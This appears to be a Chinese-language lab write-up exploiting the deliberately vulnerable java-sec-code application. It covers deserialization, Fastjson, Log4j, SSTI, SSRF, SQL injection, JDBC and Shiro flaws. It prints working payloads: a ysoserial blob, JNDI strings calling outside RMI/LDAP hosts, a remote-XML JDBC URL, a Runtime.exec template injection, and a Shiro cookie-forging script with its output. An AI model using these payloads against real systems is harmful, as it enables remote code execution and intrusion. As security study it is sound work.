        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);

        try {//使用自定义 AntObjectInputStream 类进行反序列化。该类内部通过黑名单机制禁止一些已知的恶意类
            AntObjectInputStream in = new AntObjectInputStream(bytes);  // throw InvalidClassException
            in.readObject();
            in.close();
        } catch (InvalidClassException e) {
            logger.info(e.toString());
            return e.toString();
        }

        return "I'm very OK.";
    }

    // String payload = "[\"org.jsecurity.realm.jndi.JndiRealmFactory\", {\"jndiNames\":\"ldap://30.196.97.50:1389/yto8pc\"}]";
    @RequestMapping("/jackson")
    public void Jackson(String payload) {
        //ObjectMapper 是 Jackson 提供的 JSON 解析器
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {//反序列化用户输入的 JSON 
            Object obj = mapper.readValue(payload, Object.class);
            mapper.writeValueAsString(obj);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}

```



**漏洞利用：**

ysoserial.jar 生成 payload：

```
路由：
/deserialize/rememberMe/vuln
```

```
Windows：

java -jar ~/ysoserial.jar CommonsCollections5 calc | base64

rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4
```



之后在 cookie 中加入payload：

**注意： rememberMe = \<payload>** 



![20250724132100840](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934983.png)



发包后会弹出计算器

![20250724132234120](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934545.png)



![20250724132330738](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934976.png)





## Fastjson

触发点:  JSON.parseObject()      JSON.parse()



![20250724134123264](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934865.png)

```java 
@Controller
@RequestMapping("/fastjson")
public class Fastjson {

    @RequestMapping(value = "/deserialize", method = {RequestMethod.POST})
    @ResponseBody
    public String Deserialize(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转换为json
            //Fastjson 框架将字符串解析为 JSONObject 对象
            JSONObject ob = JSON.parseObject(params);
            return ob.get("name").toString();
        } catch (Exception e) {
            return e.toString();
        }
    }
```



**漏洞利用：**

post 请求 /fastjson/deserialize ，传输 **application/json** 格式数据



payload:

```
{"name":{"@type":"java.net.Inet4Address","val":"2jf0vy.dnslog.cn"}}
```

![20250724135345425](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935795.png)





![20250724135353947](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935897.png)





## FileUpload



```java 
@Controller
@RequestMapping("/file")
public class FileUpload {

    // Save the uploaded file to this folder
    private static final String UPLOADED_FOLDER = "/tmp/";
    private final Logger logger = LoggerFactory.getLogger(this.getClass());
    private static String randomFilePath = "";

    // uplaod any file
    @GetMapping("/any")
    public String index() {
        return "upload"; // return upload.html page
    }

    // only allow to upload pictures
    @GetMapping("/pic")
    public String uploadPic() {
        return "uploadPic"; // return uploadPic.html page
    }

    @PostMapping("/upload")
    public String singleFileUpload(@RequestParam("file") MultipartFile file,
                                   RedirectAttributes redirectAttributes) {
        if (file.isEmpty()) {
            // 赋值给uploadStatus.html里的动态参数message
            redirectAttributes.addFlashAttribute("message", "Please select a file to upload");
            return "redirect:/file/status";
        }

        try {
            // Get the file and save it somewhere
            byte[] bytes = file.getBytes();
            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());
            Files.write(path, bytes);

            redirectAttributes.addFlashAttribute("message",
                    "You successfully uploaded '" + UPLOADED_FOLDER + file.getOriginalFilename() + "'");

        } catch (IOException e) {
            redirectAttributes.addFlashAttribute("message", "upload failed");
            logger.error(e.toString());
        }

        return "redirect:/file/status";
    }
```



未对文件名、后缀名进行过滤，直接上传文件。



**漏洞利用：**

功能点：http://127.0.0.1:8081/file/any ，可以上传任意文件

![20250724141442245](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935394.png)



## GetRequestURI

>
>
>request.getRequestURL() 返回全路径
>
>request.getRequestURI() 返回除去host（域名或者ip）部分的路径
>
>request.getContextPath() 返回工程名部分，如果工程映射为/，此处返回则为空
>
>request.getServletPath() 返回除去host和工程名部分的路径
>
>例如：
>
>request.getRequestURL() http://localhost:8080/jqueryLearn/resources/request.jsp 
>request.getRequestURI() /jqueryLearn/resources/request.jsp
>request.getContextPath()/jqueryLearn 
>request.getServletPath()/resources/request.jsp 



```java
@RestController
@RequestMapping("uri")
public class GetRequestURI {

    private final Logger logger = LoggerFactory.getLogger(this.getClass());

    @GetMapping(value = "/exclued/vuln")
    //方法接收 HttpServletRequest 用于获取当前请求的 URI、路径等信息
    public String exclued(HttpServletRequest request) {

        //若请求路径匹配 /css/** 和 /js/** 路径，就跳过登录
        String[] excluedPath = {"/css/**", "/js/**"};
        //获取请求 URI
        String uri = request.getRequestURI(); // Security: request.getServletPath()
        PathMatcher matcher = new AntPathMatcher();

        //打印 getRequestURI() 和 getServletPath() 的结果
        logger.info("getRequestURI: " + uri);
        logger.info("getServletPath: " + request.getServletPath());

        //遍历所有排除规则，如果当前请求 URI 匹配任意规则，则认为绕过登录校验
        for (String path : excluedPath) {
            if (matcher.match(path, uri)) {
                return "You have bypassed the login page.";
            }
        }
        //如果请求路径不匹配排除规则，则返回提示页面是登录页。
        return "This is a login page >..<";
    }
}
```



这里有一个奇怪的点：`@RequestMapping("uri")`

注释中都没有加 `uri` ，如果不加 `uri` 下面的全部访问不到，但是 `getRequestURI() 返回除去 host（域名或者ip）部分的路径` 一定会包含  `uri` ，这就导致 `String[] excluedPath = {"/css/**", "/js/**"};` 完全起不到作用，因为 `getRequestURI() `返回为 `/uri/...`，导致匹配不到 `"/css/**", "/js/**"`



![20250724151631951](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935768.png)



测试：

```Java
 @GetMapping("/testPath")
    public String testPath(HttpServletRequest request) {
        // 返回当前请求的完整路径 和 servletPath
        String uri = request.getRequestURI();
        String servletPath = request.getServletPath();
        return "getRequestURI: " + uri + "\ngetServletPath: " + servletPath;
    }
```

![20250724152429560](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935368.png)

![20250724152503479](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936550.png)



想要利用就改一下匹配规则：

```
String[] excluedPath = {"/uri/css/**", "/uri/js/**"};
```

![20250724152945636](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936819.png)





```
poc:
/uri/css/..;/exclued/vuln
/uri/css/..;bypasswaf/exclued/vuln
```



![20250724153028787](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936089.png)

![20250724153553391](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936309.png)









## jdbc-CVE 2022 21724



![20250725111517628](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936646.png)



```Java
@Slf4j
@RestController
@RequestMapping("/jdbc")
public class Jdbc {

    /**
     * <a href="https://github.com/JoyChou93/java-sec-code/wiki/CVE-2022-21724">CVE-2022-21724</a>
     */
    @RequestMapping("/postgresql")
    //接收 Base64 编码的 jdbcurl ，
    public void postgresql(String jdbcUrlBase64) throws Exception{
        byte[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64);
        String jdbcUrl = new String(b);
        log.info(jdbcUrl);
        DriverManager.getConnection(jdbcUrl);
    }

    @RequestMapping("/db2")
    public void db2(String jdbcUrlBase64) throws Exception{
        Class.forName("com.ibm.db2.jcc.DB2Driver");
        byte[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64);
        String jdbcUrl = new String(b);
        log.info(jdbcUrl);
        DriverManager.getConnection(jdbcUrl);
    }
}
```





PostgreSQL JDBC 驱动支持通过 JDBC URL 中的参数 `socketFactory` 指定自定义类，用于创建 socket 连接。

**在漏洞版本中，这个类没有限制来源**，攻击者可通过如下 URL 参数让其加载任意类：

```
socketFactory=<任意类>&socketFactoryArg=<任意参数>
```

Spring 环境中存在的 `org.springframework.context.support.ClassPathXmlApplicationContext` 是一个典型的入口点，它可自动解析并执行外部 XML 配置。

payload：

```
jdbcUrlBase64=amRiYzpwb3N0Z3Jlc3FsOi8vMTI3LjAuMC4xOjU0MzIvdGVzdC8/c29ja2V0RmFjdG9yeT1vcmcuc3ByaW5nZnJhbWV3b3JrLmNvbnRleHQuc3VwcG9ydC5DbGFzc1BhdGhYbWxBcHBsaWNhdGlvbkNvbnRleHQmc29ja2V0RmFjdG9yeUFyZz1odHRwOi8vdGVzdC5qb3ljaG91Lm9yZy8xLnhtbA==

jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://test.joychou.org/1.xml
```

**socketFactory** = 使用了 Spring 的 `ClassPathXmlApplicationContext` 类

- 该类在初始化时会加载并解析指定 URL 或文件的 Spring XML 配置。

**socketFactoryArg** = 远程的 `1.xml`

- 这个 XML 是 Spring Bean 配置文件，包含了一个 **ProcessBuilder** Bean，启动本地程序。

1.xml

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">

   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>open</value>
            <value>-a</value>
            <value>calculator</value><!-- mac 中运行计算机；Linux 就是 /bin/sh，Windows 就是 cmd.exe-->
          </list>
        </constructor-arg>
    </bean>
</beans>
```



## jsonp

>JSONP（JSON with Padding）是浏览器早期为了解决**跨域请求数据**的一种方法。它的基本原理是：
>
>```
><script src="http://example.com/jsonp?callback=handleResponse"></script>
>```
>
>服务器返回的不是 JSON，而是：
>
>```
>handleResponse({"username":"admin"});
>```
>
>如果服务器不严格校验 `callback` 参数来源，就可能造成 **跨站数据泄露（XSS）** 或 **信息泄露漏洞**。
>
>



**漏洞利用：**

搜关键字：`AbstractJsonpResponseBodyAdvice` 

```java 
@ControllerAdvice
public class Object2Jsonp extends AbstractJsonpResponseBodyAdvice {

    private final String[] callbacks;
    private final Logger logger= LoggerFactory.getLogger(this.getClass());


    // method of using @Value in constructor
    public Object2Jsonp(@Value("${joychou.security.jsonp.callback}") String[] callbacks) {
        super(callbacks);  // Can set multiple paramNames
        this.callbacks = callbac
```



## Log4j

版本存在漏洞

![20250725135906016](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938586.png)

```java

 @RequestMapping(value = "/log4j")
	//使用 logger.error(token) 将用户输入写入日志。如果 Log4j 使用的是受影响版本，这里的 ${jndi:ldap://...} 将被解析执行，触发远程加载类，导致 RCE
    public String log4j(String token) {
        logger.error(token);
        return token;
    }
```



POC1:

`/log4j?token=${jndi:ldap://${env:OS}.44wodg.dnslog.cn}`

**直接访问会对非法字符过滤，需要 url 编码后注入**

`/log4j?token=%24%7Bjndi%3Aldap%3A%2F%2F%24%7Benv%3AOS%7D.44wodg.dnslog.cn%7D`



![20250725141100248](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938049.png)



![20250725141125185](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938015.png)







POC2:

`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc"`

`rmi://169.254.39.1:1099/ihe2v1`

`${jndi:rmi://169.254.39.1:1099/ihe2v1}`

`/log4j?token=${jndi:rmi://169.254.39.1:1099/ihe2v1}`

`url 编码：/log4j?token=%24%7Bjndi%3Armi%3A%2F%2F169.254.39.1%3A1099%2Fihe2v1%7D`



![20250725141328166](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939169.png)

![20250725141333552](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939335.png)







## PathTraversal

没有对文件路径做任何过滤，攻击者可以访问任意文件

![20250725142845129](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939585.png)



![20250725142909337](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939910.png)



## SQLI

### 1./jdbc/vuln

注入点：

```Java
    @RequestMapping("/jdbc/vuln")
    public String jdbc_sqli_vul(@RequestParam("username") String username) {
        ...
        String sql = "select * from users where username = '" + username + "'";
        ...
    }
```

url:

```
http://127.0.0.1:8081/sqli/jdbc/vuln?username=joychou' OR '1'='1
```



![20250725132643238](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940681.png)





### 2./jdbc/sec



```java 
@RequestMapping("/jdbc/sec")
public String jdbc_sqli_sec(@RequestParam("username") String username) {
	...
    String sql = "select * from users where username = ?";
    ...
}    
```

采用预编译，自动进行了转义，安全



### 3./jdbc/ps/vuln

>`PreparedStatement` 是 Java JDBC 提供的 **预编译 SQL 语句执行器**，用于安全执行 SQL 查询，**防止 SQL 注入**。
>
>`PreparedStatement` 是 `java.sql` 包中的一个接口，继承自 `Statement`。与普通的 `Statement` 相比，它可以使用 `?` 占位符来动态绑定参数，而不是直接拼接 SQL 字符串。



```java 
@RequestMapping("/jdbc/ps/vuln")
public String jdbc_ps_vuln(@RequestParam("username") String username) {
	...
	String sql = "select * from users where username = '" + username + "'";
    PreparedStatement st = con.prepareStatement(sql);
	...
}	
```

错误使用 PreparedStatement , 虽然用的是 `PreparedStatement`，但 SQL 已拼接完成，还是有注入风险。



```java 
// 正确使用范式 
String sql = "SELECT * FROM users WHERE username = ?";
PreparedStatement st = con.prepareStatement(sql); 
st.setString(1,  username);  // 参数绑定 
```



url:

```
http://127.0.0.1:8081/sqli/jdbc/ps/vuln?username=joychou' OR '1'='1
```

![20250725133408711](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940290.png)







### 4./mybatis/vuln01



```java
 @GetMapping("/mybatis/vuln01")
    public List<User> mybatisVuln01(@RequestParam("username") String username) {
        return userMapper.findByUserNameVuln01(username);
    }
```

```java
@Select("select * from users where username = '${username}'")
List<User> findByUserNameVuln01(@Param("username") String username);
```



```
/sqli/mybatis/vuln01?username=admin' OR '1'='1
```

返回数据库中所有用户

![20250725134006587](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940609.png)



### 5./mybatis/vuln02



```java
@GetMapping("/mybatis/vuln02")
    public List<User> mybatisVuln02(@RequestParam("username") String username) {
        return userMapper.findByUserNameVuln02(username);
    }
```

```java
    List<User> findByUserNameVuln02(String username);
```

```xml
<select id="findByUserNameVuln02" parameterType="String" resultMap="User">
        select * from users where username like '%${_parameter}%'
    </select>
```

XML 配置中拼接 like + `${}`



```
/sqli/mybatis/vuln02?username=' OR '1'='1
->select * from users where username like '%' OR '1'='1%'
```



![20250725134316209](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940734.png)

### 6./mybatis/orderby/vuln03

```java
 @GetMapping("/mybatis/orderby/vuln03")
    public List<User> mybatisVuln03(@RequestParam("sort") String sort) {
        return userMapper.findByUserNameVuln03(sort);
    }
```

```java
    List<User> findByUserNameVuln03(@Param("order") String order);
```

```xml
 <select id="findByUserNameVuln03" parameterType="String" resultMap="User">
        select * from users
        <if test="order != null">
            order by ${order} asc
        </if>
    </select>
```

ORDER BY 拼接排序字段



```
/sqli/mybatis/orderby/vuln03?sort=id desc--+
->select * from users order by id desc--+ asc
```



![20250725134556658](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940380.png)





### 7./mybatis/sec01

```java
@GetMapping("/mybatis/sec01")
public User mybatisSec01(@RequestParam("username") String username) {
    return userMapper.findByUserName(username);
}
```

```java
@Select("select * from users where username = #{username}")
User findByUserName(@Param("username") String username);
```



### 8./mybatis/sec02

```java
@GetMapping("/mybatis/sec02")
public User mybatisSec02(@RequestParam("id") Integer id) {
    return userMapper.findById(id);
}
```

```java
User findById(Integer id);
```

```xml
<select id="findById" resultMap="User">
    select * from users where id = #{id}
</select>
```



### 9./mybatis/sec03

```java
@GetMapping("/mybatis/sec03")
public User mybatisSec03() {
    return userMapper.OrderByUsername();
}
```

```java
User OrderByUsername();
```

```xml
<select id="OrderByUsername" resultMap="User">
    select * from users order by id asc limit 1
</select>
```



### 10./mybatis/orderby/sec04

```java
@GetMapping("/mybatis/orderby/sec04")
public List<User> mybatisOrderBySec04(@RequestParam("sort") String sort) {
    return userMapper.findByUserNameVuln03(SecurityUtil.sqlFilter(sort));
}
```

```java
List<User> findByUserNameVuln03(@Param("order") String order);
```

``` xml
<select id="findByUserNameVuln03" parameterType="String" resultMap="User">
    select * from users
    <if test="order != null">
        order by ${order} asc
    </if>
</select>
```





## SSTI

SSTI（Server-Side Template Injection）就是服务器端模板注入

![20250726105655246](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941162.png)

```Java
 @GetMapping("/velocity")
    public void velocity(String template) {
        Velocity.init();

        VelocityContext context = new VelocityContext();

        context.put("author", "Elliot A.");
        context.put("address", "217 E Broadway");
        context.put("phone", "555-1337");

        //对用户传入的 template 无过滤直接传入 Velocity.evaluate 执行，
        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, "test", template);
    }
```



**漏洞利用：**

```
http://127.0.0.1:8081/ssti/velocity?template=#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc.exe")

http://127.0.0.1:8081/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc.exe%22)

```

1. `#set($e="e")`

Velocity 模板语言中的变量定义。创建一个变量 `$e`，值为字符串 `"e"`。后面我们会用 `$e.getClass()` 来获取它的 `Class` 对象，从而进入 Java 反射

2. `$e.getClass()`

`$e` 是字符串 `"e"`，调用 `.getClass()` 得到的是：

```
java.lang.String.class
```

得到了 `Class<java.lang.String>`，可以调用其 `forName()` 静态方法

3. `.forName("java.lang.Runtime")`

通过反射加载 `java.lang.Runtime` 类：

```
Class.forName("java.lang.Runtime")
```

返回 `java.lang.Runtime.class`，可以继续调用它的方法

4. `.getMethod("getRuntime", null)`

获取 `Runtime` 类的静态方法 `getRuntime()`：

```
Runtime.class.getMethod("getRuntime", null)
```

`getMethod()` 返回一个 `Method` 对象，准备执行它

5. `.invoke(null, null)`

执行静态方法 `getRuntime()`：

```
Runtime.getRuntime()
```

得到了当前 JVM 的 `Runtime` 实例，具备执行命令的能力

6. `.exec("calc.exe")`

最终执行命令：

```
Runtime.getRuntime().exec("calc.exe")
```

在 Windows 上，打开计算器

![20250726105045484](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941658.png)



## SSRF

>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。
>
>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
>
>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。
>
>![image-20250726112359793](https://gitee.com/xvshifu/pic-go/raw/master/img/20250726112359849.png)





```java
@RequestMapping(value = "/urlConnection/vuln", method = {RequestMethod.POST, RequestMethod.GET})
public String URLConnectionVuln(String url) {
    return HttpUtils.URLConnection(url);
}
```

```java 
public static String URLConnection(String url) {
    try {
        //没有校验协议和主机，对任意协议都可以访问
        URL u = new URL(url);
        URLConnection urlConnection = u.openConnection();
        BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request
        String inputLine;
        StringBuilder html = new StringBuilder();

        while ((inputLine = in.readLine()) != null) {
            html.append(inputLine);
        }
        in.close();
        return html.toString();
    } catch (Exception e) {
        logger.error(e.getMessage());
        return e.getMessage();
    }
}
```





```
/ssrf/urlConnection/vuln?url=file:/D:/1.txt
```

![20250726112949883](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941099.png)







## Shiro

```Java
@GetMapping(value = "/shiro/deserialize")
public String shiro_deserialize(HttpServletRequest req, HttpServletResponse res) {
    Cookie cookie = getCookie(req, Constants.REMEMBER_ME_COOKIE);
    if (null == cookie) {
        return "No rememberMe cookie. Right?";
    }

    try {
        String rememberMe = cookie.getValue();
        byte[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe);
        byte[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();
        ByteArrayInputStream bytes = new ByteArrayInputStream(aesDecrypt);
        ObjectInputStream in = new ObjectInputStream(bytes);
        in.readObject();
        in.close();
    } catch (Exception e){
        if (CookieUtils.addCookie(res, "rememberMe", DELETE_ME)){
            log.error(e.getMessage());
            return "RememberMe cookie decrypt error. Set deleteMe cookie success.";
        }
    }

    return "Shiro deserialize";
}
```

Shiro  `rememberMe` 功能用于“记住登录状态”。它的设计逻辑是：

用户勾选“记住我”登录后，Shiro 把用户的认证信息**序列化为字节流**，用一个固定密钥（默认是 `kPH+bIxk5D2deZiIxcaaaA==`）用 AES 加密，Base64 编码后作为 `rememberMe` Cookie 发送给浏览器。当浏览器下次请求时，Shiro：读取 `rememberMe` Cookie，用同样的密钥进行解密，然后**直接反序列化**出用户对象，只要攻击者能控制 `rememberMe` Cookie 内容，**就能构造恶意对象反序列化，从而执行任意代码。**



**漏洞利用：**

生成恶意序列化数据

```
java -jar ysoserial.jar CommonsBeanutils1 "calc.exe" > payload.bin
```

加密 Payload

```python
from Crypto.Cipher import AES
import base64

# Shiro 默认密钥
key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")

# 读取 payload
with open("D:\\CTF-Tools\\ysoserial-master\\target\\payload.bin", "rb") as f:
    payload = f.read()

# 补齐为 16 的倍数 (PKCS5Padding)
pad = 16 - len(payload) % 16
payload += bytes([pad] * pad)

# AES-CBC 加密 (IV 随机生成)
iv = b'\x00' * 16  # 实际攻击需随机 IV
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(payload)

# Base64 编码
rememberMe = base64.b64encode(iv + encrypted).decode()  # Shiro 格式: IV+密文
print("恶意 Cookie:", rememberMe)
```



```
恶意 Cookie: 
AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/gdRfw9LcryTLP6L34t9wsvsXnBU1VSf5hQbAnLNK8U6tmS8mE71BGg5DVxXjdaZ2Sktj6pGhYmrmySrHqvTuDxmZF+EgIA+g0SQMeALpCzmRK4j4Lmn3JQAqEAhglphaTt+2UB7rzvNBVbUGHx72GSISDEQiCBRjyufA+sziQUFYCP6DjWEjYOtXKTH+AKulse6AvZXu3Tkybnwa8ZPHPDQGT5b/pNB32K+ftJjsycsFSixp29sAnPqWZQ2c8pOTmznkkXlBdQTDTHtPhGTHntexCFgTHGiqALSXXHWSGmhn8WljmLUFsOLSCgEeWFPZt5uWX78goP5ZDwU/ZYGm5QyIgBBYjjYyuv6nYVZKYbH1A22Iy5sKFjbFXY3YyXWV3hLgmI801jgthjOt5G3iKXhUK557xmEXqe9gZamYVPMxKdIRdiU7fQMPH/7sVd8zAorKWwpoCxU9AedfAZbDFN0I3/gcYI0dAbQg9GyC9jMb5OiDIZE6sFd2XTSWbYQrdnePZe5gPjx8zlntQYl+7imK4pCFGgBIqX+1G0O0GvRIBoWUadk5KK8lm9J3aXjtfo25hFu6DnnPnDyRQnudEdQLjNqYpiIxJtNw/W0VgEmjpG2OsLRtsCRddr8/Vky+6t5i76oEqDU8iPh/Stjj9OfjfSNroe3B5Nbzzh1e0KWVoTPoNRc4d3THTBcaNeK3YnyTN3Ws+88WBG7vbFZF9Fj5GdksjEYcmRDnWbukoLJJH0diWwXT7cSKOdKqAsFQr0meXhGWvMAN1EP74/zvbXM/RpZZlefSQpfeh29D2wxaqdP2ydMTo+qixxTIIEspf4EFI3/vO+kPojn/GA+H38ovGW6reqxHXooV655jmV155px5BFR/MvklhgGyiSPVNoPL567alnOsfhd2R2h3/6VZv04uwu4p4dLa13EL9l